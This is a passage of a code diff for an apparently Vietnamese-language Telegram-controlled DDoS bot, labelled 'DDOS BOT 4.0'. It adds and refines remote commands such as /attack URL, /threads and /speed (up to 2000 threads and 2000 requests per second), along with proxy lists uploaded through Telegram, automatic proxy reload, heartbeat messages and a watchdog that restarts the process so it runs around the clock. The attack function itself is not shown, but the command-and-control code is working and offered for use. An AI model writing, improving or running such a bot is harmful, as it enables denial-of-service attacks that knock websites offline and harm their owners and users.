-            params = {'offset': last_update_id + 1, 'timeout': 15}
-            r = requests.get(url, params=params, timeout=20)
+            params = {'offset': last_update_id + 1, 'timeout': 10}
+            r = requests.get(url, params=params, timeout=15)
             
             if r.status_code == 200:
                 data = r.json()
@@ -707,35 +831,52 @@ def telegram_listener():
                         msg = update.get('message', {})
                         chat_id = msg.get('chat', {}).get('id')
                         
-                        if chat_id:
-                            with open("chat_id.txt", 'w') as f:
+                        if not chat_id:
+                            continue
+                        
+                        # Lưu chat_id
+                        chat_id_saved = chat_id
+                        try:
+                            with open('chat_id.txt', 'w') as f:
                                 f.write(str(chat_id))
+                        except:
+                            pass
                         
+                        # Xử lý file proxy
                         document = msg.get('document')
-                        if document and document.get('file_name', '').endswith('.txt'):
-                            file_id = document['file_id']
-                            send_telegram(f"📥 Đang tải proxy: {document['file_name']}", chat_id)
-                            save_path = f"proxy_{int(time.time())}.txt"
-                            if download_telegram_file(file_id, save_path):
-                                if update_proxies_from_file(save_path, chat_id):
-                                    import shutil
-                                    shutil.copy(save_path, "proxies.txt")
-                                threading.Timer(5, lambda: os.remove(save_path) if os.path.exists(save_path) else None).start()
-                            else:
-                                send_telegram("❌ Không thể tải file.", chat_id)
+                        if document:
+                            file_name = document.get('file_name', '')
+                            if file_name.endswith('.txt'):
+                                file_id = document['file_id']
+                                send_telegram(f"📥 Đang tải proxy: {file_name}", chat_id)
+                                
+                                save_path = f"proxy_{int(time.time())}.txt"
+                                if download_telegram_file(file_id, save_path):
+                                    if update_proxies_from_file(save_path, chat_id):
+                                        try:
+                                            import shutil
+                                            shutil.copy(save_path, "proxies.txt")
+                                        except:
+                                            pass
+                                    # Xóa file sau 5s
+                                    threading.Timer(5, lambda: os.remove(save_path) if os.path.exists(save_path) else None).start()
+                                else:
+                                    send_telegram("❌ Không thể tải file.", chat_id)
                         
+                        # Xử lý lệnh
                         text = msg.get('text', '').strip()
                         if not text:
                             continue
                         
                         cmd = text.lower()
                         
+                        # Lệnh /attack URL
                         if cmd.startswith('/attack'):
                             parts = text.split(maxsplit=1)
                             if len(parts) >= 2:
                                 target = parse_target_url(parts[1].strip())
                                 if is_running:
-                                    send_telegram("⚠️ Đang có đợt tấn công!", chat_id)
+                                    send_telegram("⚠️ Đang có đợt tấn công! Dùng /stop trước.", chat_id)
                                 else:
                                     total_proxy = len(proxy_http) + len(proxy_socks5) + len(proxy_socks4)
                                     if total_proxy == 0:
@@ -745,6 +886,7 @@ def telegram_listener():
                                         attack_thread = threading.Thread(target=run_attack, args=(target, chat_id), daemon=True)
                                         attack_thread.start()
                             else:
+                                # Dùng target mặc định
                                 if is_running:
                                     send_telegram("⚠️ Đang có đợt tấn công!", chat_id)
                                 else:
@@ -753,20 +895,24 @@ def telegram_listener():
                                         send_telegram("⚠️ Không có proxy!", chat_id)
                                     else:
                                         target = current_target
+                                        send_telegram(f"🎯 Dùng target mặc định: {target['url']}", chat_id)
                                         attack_thread = threading.Thread(target=run_attack, args=(target, chat_id), daemon=True)
                                         attack_thread.start()
                         
+                        # Lệnh /stop
                         elif cmd == '/stop':
                             if is_running:
                                 stop_event.set()
                                 is_running = False
-                                send_telegram("⛔ Đã dừng!", chat_id)
+                                send_telegram("⛔ Đã dừng tấn công!", chat_id)
                             else:
-                                send_telegram("ℹ️ Không có đợt nào đang chạy.", chat_id)
+                                send_telegram("ℹ️ Không có đợt tấn công nào đang chạy.", chat_id)
                         
+                        # Lệnh /status
                         elif cmd == '/status':
                             send_telegram(get_stats_text(), chat_id)
                         
+                        # Lệnh /proxy
                         elif cmd == '/proxy':
                             send_telegram(f"""
 🌐 <b>THỐNG KÊ PROXY</b>
@@ -774,89 +920,207 @@ HTTP: {len(proxy_http)}
 SOCKS5: {len(proxy_socks5)}
 SOCKS4: {len(proxy_socks4)}
 Tổng: {len(proxy_http) + len(proxy_socks5) + len(proxy_socks4)}
+🕐 Cập nhật: {datetime.fromtimestamp(proxy_update_time).strftime('%H:%M:%S') if proxy_update_time > 0 else 'Chưa có'}
                             """, chat_id)
                         
+                        # Lệnh /threads
                         elif cmd.startswith('/threads'):
                             try:
-                                global thread_count
-                                thread_count = int(text.split()[1])
-                                if thread_count < 1:
-                                    thread_count = 1
-                                send_telegram(f"✅ Luồng: {thread_count}", chat_id)
+                                global THREAD_COUNT
+                                new_count = int(text.split()[1])
+                                if 1 <= new_count <= 2000:
+                                    THREAD_COUNT = new_count
+                                    send_telegram(f"✅ Đã cập nhật số luồng: {THREAD_COUNT}", chat_id)
+                                else:
+                                    send_telegram("❌ Số luồng phải từ 1-2000", chat_id)
                             except:
                                 send_telegram("❌ /threads <số>", chat_id)
                         
+                        # Lệnh /speed
                         elif cmd.startswith('/speed'):
                             try:
-                                global requests_per_second
-                                requests_per_second = int(text.split()[1])
-                                if requests_per_second < 1:
-                                    requests_per_second = 1
-                                send_telegram(f"✅ Tốc độ: {requests_per_second} req/s", chat_id)
+                                global REQUESTS_PER_SECOND
+                                new_speed = int(text.split()[1])
+                                if 1 <= new_speed <= 2000:
+                                    REQUESTS_PER_SECOND = new_speed
+                                    send_telegram(f"✅ Đã cập nhật tốc độ: {REQUESTS_PER_SECOND} req/s", chat_id)
+                                else:
+                                    send_telegram("❌ Tốc độ phải từ 1-2000", chat_id)
                             except:
                                 send_telegram("❌ /speed <số>", chat_id)
                         
+                        # Lệnh /reloadproxy
+                        elif cmd == '/reloadproxy':
+                            if os.path.exists("proxies.txt"):
+                                http, socks5, socks4 = load_proxies("proxies.txt")
+                                total = len(http) + len(socks5) + len(socks4)
+                                if total > 0:
+                                    global proxy_http, proxy_socks5, proxy_socks4, proxy_list
+                                    proxy_http = http
+                                    proxy_socks5 = socks5
+                                    proxy_socks4 = socks4
+                                    proxy_list = http + socks5 + socks4
+                                    proxy_update_time = time.time()
+                                    send_telegram(f"🔄 Reload proxy: HTTP:{len(http)} S5:{len(socks5)} S4:{len(socks4)}", chat_id)
+                                else:
+                                    send_telegram("❌ Không có proxy hợp lệ.", chat_id)
+                            else:
+                                send_telegram("❌ Không tìm thấy file proxies.txt", chat_id)
+                        
+                        # Lệnh /help
                         elif cmd == '/help':
                             help_text = """
-<b>🤖 DDOS 500+ REQ/S - TỐI ƯU</b>
+<b>🤖 DDOS BOT 4.0 - HƯỚNG DẪN</b>
 
-📌 CHẠY 24/7 - TỐC ĐỘ CAO
+📌 <b>CHẠY 24/7 - TỐC ĐỘ CAO</b>
 
-📤 Gửi file .txt để cập nhật proxy
+📤 <b>GỬI FILE PROXY:</b>
+Gửi file .txt chứa danh sách proxy
 Hỗ trợ: HTTP, SOCKS4, SOCKS5
+Định dạng:
+<code>ip:port</code>
+<code>socks5://user:pass@ip:port</code>
+<code>user:pass@ip:port</code>
 
-📋 LỆNH:
-/attack URL - Tấn công
-/stop - Dừng
-/status - Trạng thái
-/proxy - Số proxy
-/threads N - Đổi luồng (mặc định 800)
-/speed N - Đổi tốc độ (mặc định 500)
-/help - Trợ giúp
+📋 <b>LỆNH:</b>
+<code>/attack URL</code> - Tấn công
+<code>/stop</code> - Dừng
+<code>/status</code> - Trạng thái
+<code>/proxy</code> - Số proxy
+<code>/threads N</code> - Đổi luồng
+<code>/speed N</code> - Đổi tốc độ
+<code>/reloadproxy</code> - Tải lại proxy
+<code>/help</code> - Trợ giúp
 
-⚡ Tối ưu: 800 luồng, 500 req/s
-⏱ Mỗi đợt 120s
-❤️ Heartbeat mỗi 30 phút
-🔄 Tự động reload proxy
+⚡ <b>TỐI ƯU:</b>
+- 800 luồng
+- 500 req/s
+- 120s mỗi đợt
+- Cache DNS
+- Pool connection
+- Tự động reload proxy
+- Heartbeat 30 phút
                             """
                             send_telegram(help_text, chat_id)
             
-            time.sleep(1.5)
-        except:
-            time.sleep(3)
+            time.sleep(2)
+        except Exception as e:
+            time.sleep(5)
 
 # =====================================================
-# KHỞI CHẠY
+# HEARTBEAT - GIỮ BOT SỐNG
+# =====================================================
+def heartbeat_loop():
+    """Heartbeat giữ bot sống và thông báo định kỳ"""
+    global heartbeat_count
+    
+    while True:
+        time.sleep(60)
+        heartbeat_count += 1
+        
+        # Heartbeat mỗi 30 phút
+        if heartbeat_count % 30 == 0:
+            with stats_lock:
+                total = attack_stats['total_requests']
+                uptime = int(time.time() - bot_start_time)
+                uptime_str = f"{uptime//3600}h{(uptime%3600)//60}m{uptime%60}s"
+            
+            send_telegram(f"""
+❤️ <b>HEARTBEAT #{heartbeat_count}</b>
+⏱ Uptime: {uptime_str}
+📨 Tổng req: {total:,}
+🌐 HTTP:{len(proxy_http)} S5:{len(proxy_socks5)} S4:{len(proxy_socks4)}
+⚡ Tốc độ cài: {REQUESTS_PER_SECOND} req/s
+🧵 Luồng: {THREAD_COUNT}
+📌 Status: {'🟢 RUNNING' if is_running else '🔴 IDLE'}
+            """)
+
+# =====================================================
+# TỰ ĐỘNG RELOAD PROXY
+# =====================================================
+def auto_reload_proxy():
+    """Tự động reload proxy từ file mỗi 10 phút"""
+    global proxy_http, proxy_socks5, proxy_socks4, proxy_list, proxy_update_time
+    
+    while True:
+        time.sleep(600)  # 10 phút
+        
+        if os.path.exists("proxies.txt"):
+            http, socks5, socks4 = load_proxies("proxies.txt")
+            total = len(http) + len(socks5) + len(socks4)
+            
+            if total > 0:
+                proxy_http = http
+                proxy_socks5 = socks5
+                proxy_socks4 = socks4
+                proxy_list = http + socks5 + socks4
+                proxy_update_time = time.time()
+                
+                # Thông báo nếu có thay đổi
+                if total > 0:
+                    send_telegram(f"🔄 Tự động reload proxy: HTTP:{len(http)} S5:{len(socks5)} S4:{len(socks4)}")
+
+# =====================================================
+# WATCHDOG - TỰ ĐỘNG RESTART
+# =====================================================
+def watchdog():
+    """Giám sát và tự động restart nếu crash"""
+    while True:
+        time.sleep(60)
+        # Kiểm tra luồng chính
+        active = threading.active_count()
+        if active < 3:
+            send_telegram("⚠️ WATCHDOG: PHÁT HIỆN CRASH! ĐANG RESTART...")
+            time.sleep(3)
+            try:
+                os.execv(sys.executable, [sys.executable] + sys.argv)
+            except:
+                pass
+
+# =====================================================
+# KHỞI CHẠY CHÍNH
 # =====================================================
 if __name__ == "__main__":
-    with stats_lock:
-        attack_stats['bot_start'] = time.time()
+    # Lưu thời gian khởi động
+    bot_start_time = time.time()
     
+    # Tải proxy
     proxy_file = "proxies.txt"
     if os.path.exists(proxy_file):
         proxy_http, proxy_socks5, proxy_socks4 = load_proxies(proxy_file)
         proxy_list = proxy_http + proxy_socks5 + proxy_socks4
         proxy_update_time = time.time()
         print(f"[+] Đã tải proxy: HTTP={len(proxy_http)} SOCKS5={len(proxy_socks5)} SOCKS4={len(proxy_socks4)}")
+    else:
+        print("[+] Chưa có file proxies.txt")
+        # Tạo file mặc định
+        with open("proxies.txt", 'w') as f:
+            f.write("# Proxy list - ip:port\n")
+            f.write("# Example: 192.168.1.1:8080\n")
+            f.write("# Example: socks5://user:pass@1.2.3.4:1080\n")
     
     print("="*60)
-    print("🔥 DDOS 500+ REQ/S - TỐI ƯU")
+    print("🔥 DDOS BOT 4.0 - TỐI ƯU TỐI ĐA")
     print("="*60)
     print(f"[+] Token: {TELEGRAM_BOT_TOKEN[:15]}...")
     print(f"[+] HTTP: {len(proxy_http)} | SOCKS5: {len(proxy_socks5)} | SOCKS4: {len(proxy_socks4)}")
     print(f"[+] Tổng proxy: {len(proxy_list)}")
-    print(f"[+] Luồng: {thread_count}")
-    print(f"[+] Tốc độ cài: {requests_per_second} req/s")
+    print(f"[+] Luồng: {THREAD_COUNT}")
+    print(f"[+] Tốc độ: {REQUESTS_PER_SECOND} req/s")
+    print(f"[+] Max run: {MAX_RUN_TIME}s")
     print("="*60)
     print("[+] BOT ĐÃ SẴN SÀNG - CHẠY 24/7")
     print("[+] TỐC ĐỘ TỐI ĐA 500+ REQ/S")
+    print("[+] HỖ TRỢ HTTP, SOCKS4, SOCKS5")
     print("="*60)
     
+    # Khởi chạy các thread
     threading.Thread(target=telegram_listener, daemon=True).start()
     threading.Thread(target=heartbeat_loop, daemon=True).start()
     threading.Thread(target=auto_reload_proxy, daemon=True).start()
     threading.Thread(target=watchdog, daemon=True).start()
     
+    # Giữ chương trình chạy
     try:
         while True:
             time.sleep(3600)
